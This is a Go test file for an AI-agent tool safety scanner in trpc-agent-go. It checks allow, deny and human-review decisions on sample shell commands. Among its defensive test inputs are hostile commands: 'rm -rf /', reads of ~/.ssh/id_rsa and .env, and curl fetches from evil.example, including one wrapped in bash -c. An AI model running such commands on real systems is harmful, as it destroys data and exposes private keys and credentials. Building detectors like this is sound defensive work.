//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"trpc.group/trpc-go/trpc-agent-go/tool"
)

func TestScanRequiredSamples(t *testing.T) {
	policy := DefaultPolicy()
	tests := []struct {
		name     string
		req      Request
		decision Decision
		ruleID   string
	}{
		{
			name: "safe go test",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "go test ./...",
			},
			decision: DecisionAllow,
		},
		{
			name: "dangerous delete",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "rm -rf /",
			},
			decision: DecisionDeny,
			ruleID:   "dangerous.rm_rf",
		},
		{
			name: "read key",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "cat ~/.ssh/id_rsa",
			},
			decision: DecisionDeny,
			ruleID:   "sensitive.path_access",
		},
		{
			name: "non whitelist network",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "curl https://evil.example/install.sh",
			},
			decision: DecisionDeny,
			ruleID:   "network.non_whitelisted_domain",
		},
		{
			name: "whitelist network",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "curl https://api.github.com/repos/trpc-group/trpc-agent-go",
			},
			decision: DecisionAllow,
		},
		{
			name: "shell wrapper bypass",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "bash -c 'curl https://evil.example/x'",
			},
			decision: DecisionDeny,
			ruleID:   "shell.bypass",
		},
		{
			name: "pipeline command",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "cat README.md | wc -l",
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "shell.pipeline_review",
		},
		{
			name: "dependency install",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "npm install left-pad",
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "dependency.environment_change",
		},
		{
			name: "long running sleep",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "sleep 9999",
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "resource.long_sleep",
		},
		{
			name: "large output",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "yes x | head -c 9999999",
			},
			decision: DecisionDeny,
			ruleID:   "resource.large_output",
		},
		{
			name: "hostexec long session",
			req: Request{
				ToolName:   "exec_command",
				Backend:    BackendHostExec,
				Command:    "tail -f app.log",
				TTY:        true,
				Background: true,
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "hostexec.long_session",
		},
		{
			name: "ask human review",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "python -c 'import subprocess; subprocess.run([\"go\", \"test\", \"./...\"])'",
				CodeBlocks: []CodeBlock{{
					Language: "python",
					Code:     "import subprocess; subprocess.run(['go', 'test', './...'])",
				}},
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "codeexec.host_command_bridge",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			report := Scan(tt.req, policy)
			if report.Decision != tt.decision {
				t.Fatalf("decision = %q, want %q; report: %+v",
					report.Decision, tt.decision, report)
			}
			if tt.ruleID != "" && report.RuleID != tt.ruleID {
				t.Fatalf("rule id = %q, want %q; report: %+v",
					report.RuleID, tt.ruleID, report)
			}
			if err := ValidateReport(report); err != nil {
				t.Fatalf("report missing required fields: %v", err)
			}
		})
	}
}

func TestLoadPolicyChangesNetworkAllowlistWithoutCode(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "tool_safety_policy.yaml")
	content := []byte(`
network_allowlist:
  - example.com
denied_paths:
  - .env
`)
	if err := os.WriteFile(path, content, 0o600); err != nil {
		t.Fatal(err)
	}
	policy, err := LoadPolicy(path)
	if err != nil {
		t.Fatal(err)
	}
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "curl https://example.com/file",
	}, policy)
	if report.Decision != DecisionAllow {
		t.Fatalf("decision = %q, want allow; report: %+v", report.Decision, report)
	}
	report = Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "curl https://api.github.com/repos/x/y",
	}, policy)
	if report.Decision != DecisionDeny {
		t.Fatalf("decision = %q, want deny; report: %+v", report.Decision, report)
	}
}

func TestLoadPolicyCanDisablePipelineReview(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "tool_safety_policy.yaml")
	content := []byte(`
review_shell_pipelines: false
allowed_commands:
  - cat
  - wc
`)
	if err := os.WriteFile(path, content, 0o600); err != nil {
		t.Fatal(err)
	}
	policy, err := LoadPolicy(path)
	if err != nil {
		t.Fatal(err)
	}
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "cat README.md | wc -l",
	}, policy)
	if report.Decision != DecisionAllow {
		t.Fatalf("decision = %q, want allow; report: %+v", report.Decision, report)
	}
}

func TestPermissionPolicyBlocksAndAudits(t *testing.T) {
	args := []byte(`{"command":"cat .env","timeout_sec":10}`)
	var audit bytes.Buffer
	policy := NewPermissionPolicy(DefaultPolicy(), WithAuditWriter(&audit))
	decision, err := policy.CheckToolPermission(nil, &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: args,
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny {
		t.Fatalf("action = %q, want deny", decision.Action)
	}
	var event AuditEvent
	if err := json.Unmarshal(bytes.TrimSpace(audit.Bytes()), &event); err != nil {
		t.Fatalf("audit was not json: %v\n%s", err, audit.String())
	}
	if event.ToolName != "workspace_exec" ||
		event.Decision != DecisionDeny ||
		event.RuleID != "sensitive.path_access" ||
		!event.Blocked {
		t.Fatalf("unexpected audit event: %+v", event)
	}
}

func TestPermissionPolicyMapsReviewToAsk(t *testing.T) {
	args := []byte(`{"command":"npm install left-pad"}`)
	policy := NewPermissionPolicy(DefaultPolicy())
	decision, err := policy.CheckToolPermission(nil, &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: args,
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionAsk {
		t.Fatalf("action = %q, want ask", decision.Action)
	}
}

func TestScanRedactsSecrets(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "echo OPENAI_API_KEY=sk-1234567890abcdef",
	}, DefaultPolicy())
	if report.Decision != DecisionDeny {
		t.Fatalf("decision = %q, want deny", report.Decision)
	}
	if !report.Redacted {
		t.Fatalf("report should indicate redaction")
	}
	raw, _ := json.Marshal(report)
	if bytes.Contains(raw, []byte("sk-1234567890abcdef")) {
		t.Fatalf("report leaked secret: %s", raw)
	}
}

func TestScanDeniedCWD(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "ls",
		Cwd:      "~/.ssh",
	}, DefaultPolicy())
	if report.Decision != DecisionDeny || report.RuleID != "sensitive.cwd_access" {
		t.Fatalf("unexpected report: %+v", report)
	}
}

func TestScanHighConcurrencyNeedsReview(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "printf jobs | xargs -P 64 -n 1 echo",
	}, DefaultPolicy())
	if report.Decision != DecisionNeedsHumanReview ||
		report.RuleID != "resource.high_concurrency" {
		t.Fatalf("unexpected report: %+v", report)
	}
}

func TestScanFiveHundredCommandsUnderOneSecond(t *testing.T) {
	command := strings.Repeat("go test ./...\n", 500)
	start := time.Now()
	report := Scan(Request{
		ToolName: "execute_code",
		Backend:  BackendCodeExec,
		CodeBlocks: []CodeBlock{{
			Language: "python",
			Code:     command,
		}},
	}, DefaultPolicy())
	elapsed := time.Since(start)
	if elapsed > time.Second {
		t.Fatalf("scan took %s, want <= 1s", elapsed)
	}
	if report.Decision != DecisionAllow {
		t.Fatalf("unexpected report: %+v", report)
	}
}
